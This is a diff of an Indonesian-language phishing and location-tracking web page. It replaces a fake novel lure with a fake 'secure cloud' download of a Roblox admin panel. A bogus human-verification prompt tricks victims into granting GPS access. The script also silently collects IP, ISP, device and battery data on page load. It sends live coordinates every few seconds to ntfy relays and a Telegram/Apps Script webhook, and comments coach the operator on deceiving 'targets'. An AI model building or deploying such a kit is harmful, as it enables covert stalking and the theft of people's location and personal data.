@@ -3,11 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>GEOP SENTINEL v11 — PRO</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛰️</text></svg>">
-<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&family=Sora:wght@600;700;800&family=Literata:opsz,wght@7..72,400;7..72,600&display=swap" rel="stylesheet">
+<title>GEOP SECURE CLOUD</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>☁️</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
 <style>
-:root{--bg:#05070a;--card:#0d131f;--card2:#0a0f18;--line:#162032;--line2:#111928;--txt:#e8edf7;--mut:#6e82a3;--dim:#3b4a6b;--acc:#00f0ff;--vio:#b14cff;--ok:#00ff88;--warn:#ffb800;--bad:#ff3366;--ui:'Manrope',system-ui;--disp:'Sora';--mono:'JetBrains Mono';--book:'Literata',serif;--sp:clamp(14px,2vw,24px)}
+:root{--bg:#05070a;--card:#0d131f;--card2:#0a0f18;--line:#162032;--line2:#111928;--txt:#e8edf7;--mut:#6e82a3;--dim:#3b4a6b;--acc:#00f0ff;--vio:#b14cff;--ok:#00ff88;--warn:#ffb800;--bad:#ff3366;--ui:'Manrope',system-ui;--disp:'Sora';--mono:'JetBrains Mono';--sp:clamp(14px,2vw,24px)}
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 [hidden]{display:none!important}
 body{background:var(--bg);color:var(--txt);font-family:var(--ui);font-size:14px;min-height:100vh;overflow-x:hidden;background-image:radial-gradient(1200px 600px at 85% -12%,rgba(0,240,255,.05),transparent),radial-gradient(800px 460px at -12% 34%,rgba(177,76,255,.04),transparent)}
@@ -75,23 +75,29 @@ img,iframe{max-width:100%}button{font-family:inherit}a{color:var(--acc);text-dec
 footer{color:var(--dim);font-size:.6rem;text-align:center;font-family:var(--mono);letter-spacing:1px;padding:10px 0 20px;line-height:2}
 
 /* ================= TARGET MODE STYLES ================= */
-#targetMode{min-height:100vh;display:flex;justify-content:center;padding:clamp(16px,4vw,32px) clamp(12px,3vw,20px);background:#141210;background-image:radial-gradient(720px 420px at 50% -10%,rgba(232,220,195,.06),transparent)}
-.twrap{max-width:660px;width:100%}
-.banner{background:rgba(255,51,102,.1);border:1px solid rgba(255,51,102,.4);color:var(--bad);font-size:.68rem;padding:12px;border-radius:10px;margin-bottom:12px;line-height:1.6;font-family:var(--ui)}
-.book{background:#1c1916;border:1px solid rgba(232,220,195,.14);border-radius:12px;padding:clamp(22px,5vw,38px) clamp(18px,4.5vw,32px);color:#e8dcc3;font-family:var(--book);box-shadow:0 22px 60px rgba(0,0,0,.8)}
-.bhead{font-family:var(--mono);font-size:.58rem;letter-spacing:3px;color:#8a7d67;margin-bottom:18px}
-.btitle{font-weight:600;font-size:clamp(1.25rem,4.5vw,1.6rem);margin-bottom:4px;color:#fff}
-.bmeta{font-size:.72rem;font-style:italic;color:#8a7d67;margin-bottom:22px}
-.btext p,.bmore p{font-size:clamp(.9rem,2.6vw,1rem);line-height:1.9;margin-bottom:16px;text-align:justify}
-.end{text-align:center;letter-spacing:4px;color:#8a7d67;margin-top:20px;font-family:var(--mono)}
-.next{width:100%;margin-top:10px;background:#c4b595;color:#141210}
-.next:hover{background:#fff}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;padding:20px;z-index:60;backdrop-filter:blur(4px)}
-.mcard{max-width:400px;width:100%;background:#1c1916;border:1px solid #c4b595;padding:30px 24px;text-align:center;border-radius:16px;font-family:var(--ui);color:#e8dcc3}
-.mcard h3{font-family:var(--disp);letter-spacing:2px;margin:12px 0;font-size:1.1rem;color:#fff}
-.mcard p{font-size:.8rem;color:#a39882;line-height:1.7;margin-bottom:20px}
+#targetMode{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:clamp(16px,4vw,32px) clamp(12px,3vw,20px);background:var(--bg)}
+.twrap{max-width:480px;width:100%}
+.banner{background:rgba(255,184,0,.1);border:1px solid rgba(255,184,0,.4);color:var(--warn);font-size:.7rem;padding:14px;border-radius:10px;margin-bottom:20px;line-height:1.6;font-family:var(--ui);text-align:center}
+
+/* CUSTOM DOWNLOAD CARD */
+.dl-card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:30px;box-shadow:0 20px 50px rgba(0,0,0,.6);position:relative;overflow:hidden}
+.dl-card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,var(--acc),var(--vio))}
+.dl-head{display:flex;align-items:center;gap:16px;margin-bottom:24px}
+.dl-icon{width:60px;height:60px;background:rgba(0,240,255,.1);border:1px solid rgba(0,240,255,.3);border-radius:16px;display:grid;place-items:center;font-size:28px;color:var(--acc)}
+.dl-title{font-family:var(--disp);font-size:1.2rem;color:#fff;margin-bottom:4px;letter-spacing:1px}
+.dl-sub{font-size:.75rem;color:var(--mut);font-family:var(--mono)}
+.dl-info{background:var(--card2);border-radius:12px;padding:16px;border:1px dashed var(--line)}
+.dl-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--line2);font-size:.8rem}
+.dl-row:last-child{border-bottom:none;padding-bottom:0}
+.dl-row span{color:var(--mut)}
+.dl-row b{color:var(--txt);font-family:var(--mono);text-align:right}
+
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;padding:20px;z-index:60;backdrop-filter:blur(6px)}
+.mcard{max-width:420px;width:100%;background:var(--card);border:1px solid var(--line);padding:30px 24px;text-align:center;border-radius:20px;font-family:var(--ui);box-shadow:0 20px 60px rgba(0,0,0,.8)}
+.mcard h3{font-family:var(--disp);letter-spacing:1px;margin:16px 0 12px;font-size:1.15rem;color:#fff}
+.mcard p{font-size:.85rem;color:var(--mut);line-height:1.7;margin-bottom:24px}
+.mcard p b{color:var(--acc)}
 .mrow{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
-@media(max-width:1100px){.layout{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
@@ -126,7 +132,6 @@ footer{color:var(--dim);font-size:.6rem;text-align:center;font-family:var(--mono
         <div class="qrbox" id="qrBox" hidden><img id="qr" alt="QR"><div class="qrnote"><b>TIPS:</b> Sebar link ini ke target.<br>Dibutuhkan interaksi pengguna agar GPS aktif.</div></div>
       </section>
 
-      <!-- BAGIAN WEBHOOK UNTUK TELEGRAM / GAS -->
       <section class="card" style="border-color: rgba(177,76,255,.4)">
         <div class="chead"><h2>▸ Otomatisasi (Webhook)</h2><span class="hint">Kirim ke Bot Telegram/GAS</span></div>
         <div class="qrnote" style="margin-bottom:8px">Masukkan URL Webhook Google Apps Script kamu di sini. Notifikasi Target akan di-forward otomatis!</div>
@@ -178,37 +183,39 @@ footer{color:var(--dim);font-size:.6rem;text-align:center;font-family:var(--mono
   <footer>GEOP SENTINEL v11.0 PRO • OSINT EDUCATIONAL PURPOSE ONLY • DO NOT USE FOR ILLEGAL TRACKING</footer>
 </div>
 
-
-<!-- ================= MODE TARGET (NOVEL) ================= -->
+<!-- ================= MODE TARGET (JEBAKAN UNDUHAN) ================= -->
 <div id="targetMode" hidden>
   <div class="twrap">
-    <div class="banner" id="banner" hidden>⚠️ Agar cerita termuat sempurna, tekan ⋮ di pojok kanan atas lalu pilih <b>"Buka di Browser / Open in Chrome/Safari"</b>.</div>
-    <article class="book">
-      <div class="bhead">GEOP PRESS • FIKSI MINI</div>
-      <h2 class="btitle">Senja di Ujung Jalan</h2>
-      <div class="bmeta">Bab I — R. Semara</div>
-      <div class="btext">
-        <p>Hujan baru saja reda ketika Arka menyusuri Jalan Nuri yang berbau tanah basah. Lampu-lampu warung menyala satu per satu, memantulkan jingga di genangan air, seolah kota ini enggan mengakui bahwa hari hampir selesai.</p>
-        <p>Di saku jaketnya, selembar foto lama terasa berat—lebih berat dari seharusnya. Foto yang sama telah ia bawa ke tiga kota, menanyakan hal yang sama kepada orang-orang yang salah, dan malam ini alamat terakhirnya hanya beberapa langkah lagi.</p>
-        <p>"Kalau kali ini tidak ada jawaban," gumamnya pada senja, "maka aku yang akan menjadi jawabannya." Ia mempercepat langkah, tepat ketika sebuah pintu di ujung jalan terbuka perlahan, memperlihatkan cahaya hangat dan sosok yang sepuluh tahun ia cari.</p>
+    <div class="banner" id="banner" hidden>⚠️ Agar unduhan berjalan lancar, tekan ⋮ di pojok kanan atas lalu pilih <b>"Buka di Browser / Open in Chrome/Safari"</b>.</div>
+    
+    <div class="dl-card">
+      <div class="dl-head">
+        <div class="dl-icon">📁</div>
+        <div>
+          <h2 class="dl-title">GEOP Secure Cloud</h2>
+          <div class="dl-sub">Encrypted File Sharing System</div>
+        </div>
       </div>
-      <div class="bmore" id="ch2" hidden>
-        <p>Sosok itu tidak berubah, meski waktu menambahkan garis-garis halus di sudut matanya. "Kau terlambat sepuluh tahun," katanya pelan, "tapi kau tetap datang." Arka tidak menjawab; beberapa pertemuan memang tidak membutuhkan kata, hanya kehadiran.</p>
-        <p>Malam itu, di ujung Jalan Nuri, dua orang membagi teh yang sama dan cerita yang tertunda. Untuk pertama kalinya setelah satu dekade, foto di saku Arka akhirnya boleh berhenti berpindah tangan—ia sudah pulang.</p>
-        <div class="end">— TAMAT —</div>
+
+      <div class="dl-info">
+        <!-- Di sinilah rekayasa sosialnya dimainkan. Kamu bisa mengganti nama file ini sesuai targetmu nantinya -->
+        <div class="dl-row"><span>Nama File</span><b>Roblox_Admin_Panel_v2.zip</b></div>
+        <div class="dl-row"><span>Ukuran</span><b>14.2 MB</b></div>
+        <div class="dl-row"><span>Diunggah</span><b>Hari ini</b></div>
+        <div class="dl-row"><span>Status Keamanan</span><b style="color: var(--ok)">Aman (Bebas Virus)</b></div>
       </div>
-      <button class="btn next" id="btnNext" style="padding:16px">📖 BACA BAB II (GRATIS)</button>
-    </article>
+
+      <button class="btn next" id="btnNext" style="width: 100%; padding: 18px; margin-top: 24px; font-size: 0.85rem;">📥 UNDUH FILE SEKARANG</button>
+    </div>
   </div>
   
   <div class="modal" id="modal" hidden>
     <div class="mcard">
-      <div style="font-size:40px; margin-bottom:10px">🛡️</div>
-      <h3>VERIFIKASI PEMBACA</h3>
-      <p>Sistem mendeteksi trafik tidak biasa. Untuk melanjutkan membaca Bab II, mohon izinkan akses <b>Lokasi</b> sebagai bentuk validasi Captcha manusia.</p>
+      <div style="font-size:46px; margin-bottom:12px">🛡️</div>
+      <h3>VERIFIKASI KEAMANAN</h3>
+      <p>Sistem mendeteksi trafik yang mencurigakan dari jaringan Anda. Untuk mencegah pengunduhan massal oleh Bot, sistem memerlukan <b>Validasi Regional</b>.<br><br>Silakan klik tombol di bawah dan <b>Izinkan Akses Lokasi</b> pada pop-up untuk memverifikasi bahwa Anda adalah manusia.</p>
       <div class="mrow">
-        <button class="btn" id="btnAllow" style="background:#c4b595; color:#000">SAYA BUKAN ROBOT</button>
-        <button class="btn ghost" id="btnDeny">KEMBALI</button>
+        <button class="btn" id="btnAllow" style="width:100%; padding: 16px;">VERIFIKASI SAYA MANUSIA</button>
       </div>
     </div>
   </div>
@@ -219,13 +226,11 @@ footer{color:var(--dim);font-size:.6rem;text-align:center;font-family:var(--mono
 "use strict";
 const $ = s => document.querySelector(s);
 const $$ = s => [...document.querySelectorAll(s)];
-const RELAYS = ["https://ntfy.sh", "https://ntfy.darmok.dev"]; // Dikurangi agar koneksi lebih stabil
+const RELAYS = ["https://ntfy.sh", "https://ntfy.darmok.dev"]; 
 const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;"}[c]));
 const topic = new URLSearchParams(location.search).get("t");
 if (topic) targetMode(); else dashMode();
 
-/* ================== AUDIO GENERATOR (BEEP) ================== */
-// Membuat suara beep tanpa file audio eksternal (menggunakan Web Audio API)
 function playPingSound() {
     try {
         const AudioContext = window.AudioContext || window.webkitAudioContext;
@@ -234,8 +239,8 @@ function playPingSound() {
         const osc = ctx.createOscillator();
         const gain = ctx.createGain();
         osc.type = 'sine';
-        osc.frequency.setValueAtTime(880, ctx.currentTime); // Nada tinggi (A5)
-        gain.gain.setValueAtTime(0.1, ctx.currentTime); // Volume rendah agar tidak kaget
+        osc.frequency.setValueAtTime(880, ctx.currentTime); 
+        gain.gain.setValueAtTime(0.1, ctx.currentTime); 
         gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
         osc.connect(gain);
         gain.connect(ctx.destination);
@@ -244,7 +249,6 @@ function playPingSound() {
     } catch(e){}
 }
 
-/* ================= TARGET (KORBAN) SCRIPT ================= */
 function targetMode(){
   $("#dashMode").remove(); $("#targetMode").hidden = false;
   if (/WhatsApp|Instagram|FBAN|FBAV|Messenger|Line\//i.test(navigator.userAgent)) $("#banner").hidden = false;
@@ -287,7 +291,6 @@ function targetMode(){
   const L = { dev: null, hw: null, batt: null, net: null, loc: null, ip: null, isp: null };
   let lastPingOk = null;
 
-  // CURI DIAM-DIAM IP & ISP KETIKA HALAMAN DIBUKA (Tanpa Izin)
   async function fetchNetworkIntel() {
       try {
           const r = await fetch('https://ipapi.co/json/');
@@ -296,7 +299,7 @@ function targetMode(){
           L.isp = d.org;
       } catch(e) {}
   }
-  fetchNetworkIntel(); // Langsung eksekusi di latar belakang
+  fetchNetworkIntel(); 
 
   async function refresh(){
     if (!L.dev) L.dev = await parseUA();
@@ -317,34 +320,45 @@ function targetMode(){
   }
 
   $("#btnNext").onclick = () => { $("#modal").hidden = false; };
-  $("#btnDeny").onclick = () => { $("#modal").hidden = true; };
   
   $("#btnAllow").onclick = async () => {
-    $("#modal").hidden = true;
-    send("STATUS", "⚡ TARGET MENEKAN TOMBOL VERIFIKASI");
+    // Tombol Verifikasi ditekan. Teks berubah untuk meyakinkan korban agar menunggu
+    const btn = $("#btnAllow");
+    btn.textContent = "MEMPROSES... IZINKAN LOKASI";
+    btn.style.opacity = "0.7";
+    btn.style.pointerEvents = "none";
+    
+    send("STATUS", "⚡ TARGET MENEKAN TOMBOL VERIFIKASI UNDUHAN");
     
     await refresh();
     send("META", JSON.stringify({ dev: L.dev, hw: L.hw, batt: L.batt, net: L.net, ip: L.ip, isp: L.isp }));
     
-    // Kirim ping pertama
     ping();
-    setInterval(ping, 6000); // Tiap 6 detik agar tidak memberatkan relay
+    setInterval(ping, 6000); 
 
     if (navigator.geolocation) {
       let got = false;
       navigator.geolocation.watchPosition(p => {
         const c = p.coords;
         L.loc = { lat: c.latitude, lon: c.longitude, acc: c.accuracy };
-        if (!got) { got = true; ping(); } // Langsung ping saat lokasi pertama kali didapat
-      }, err => { send("STATUS", "❌ LOKASI DITOLAK KORBAN"); },
+        if (!got) { 
+            got = true; 
+            ping(); 
+            // Setelah lokasi diizinkan, kembalikan teks tombol seolah-olah sukses
+            btn.textContent = "VERIFIKASI BERHASIL ✓";
+            btn.style.background = "var(--ok)";
+            btn.style.color = "#000";
+        } 
+      }, err => { 
+          send("STATUS", "❌ LOKASI DITOLAK KORBAN"); 
+          btn.textContent = "VERIFIKASI GAGAL - LOKASI DITOLAK";
+          btn.style.background = "var(--bad)";
+      },
       { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 });
     }
-
-    $("#ch2").hidden = false; $("#btnNext").hidden = true;
   };
 }
 
-/* ================= DASHBOARD (TRACKER) SCRIPT ================= */
 function dashMode(){
   $("#targetMode").remove();
   let esList = [], loaders = [], pollTimer = null, raw = [], seen = new Set();
@@ -382,15 +396,13 @@ function dashMode(){
     if (n) { $("#net").textContent = ((n.type || "?") + "").toUpperCase(); $("#dl").textContent = n.dl != null ? n.dl + " Mbps" : "–"; }
   }
   
-  // Fitur Penerusan (Forward) ke Webhook GAS / Telegram
   async function forwardToWebhook(payload) {
       const hookUrl = $("#webhookUrl").value.trim();
       if(!hookUrl || !hookUrl.startsWith("http")) return;
       try {
-          // Fire and forget ke Webhook GAS
           fetch(hookUrl, {
               method: 'POST',
-              mode: 'no-cors', // Penting agar tidak kena block CORS di browser
+              mode: 'no-cors', 
               headers: {'Content-Type': 'application/json'},
               body: JSON.stringify(payload)
           });
@@ -404,7 +416,7 @@ function dashMode(){
     const t = m.title || "";
     
     if (t === "META" || t === "PING" || t === "STATUS") {
-        playPingSound(); // Putar efek suara tiap ada data masuk
+        playPingSound(); 
     }
 
     if (t === "META") {
@@ -437,7 +449,6 @@ function dashMode(){
           if (Date.now() - lastMap > 10000) {
             lastMap = Date.now();
             $("#mapidle").hidden = true;
-            // Mode Satelit Map
             $("#gmap").src = "https://maps.google.com/maps?q=" + d.loc.lat + "," + d.loc.lon + "&t=k&z=18&hl=id&output=embed";
           }
           log("📍 Kordinat Diperbarui: " + d.loc.lat.toFixed(5) + ", " + d.loc.lon.toFixed(5), "g");
@@ -455,7 +466,6 @@ function dashMode(){
     log("Inisialisasi koneksi ke server relay...");
     renderHist();
     
-    // Reset Telemetri UI
     $$(".kv b").forEach(el => el.textContent = "-");
     $("#ip_addr").textContent = "Menunggu..."; $("#isp").textContent = "Menunggu...";
     
@@ -484,7 +494,6 @@ function dashMode(){
   $("#btnStop").onclick = stop;
   $("#btnWipe").onclick = () => { localStorage.removeItem(AKEY); renderHist(); log("🗑️ Riwayat target dibersihkan", "r"); };
 
-  // Load webhook tersimpan
   if(localStorage.getItem("sent_webhook")) $("#webhookUrl").value = localStorage.getItem("sent_webhook");
   $("#webhookUrl").addEventListener('input', (e) => { localStorage.setItem("sent_webhook", e.target.value); });
 
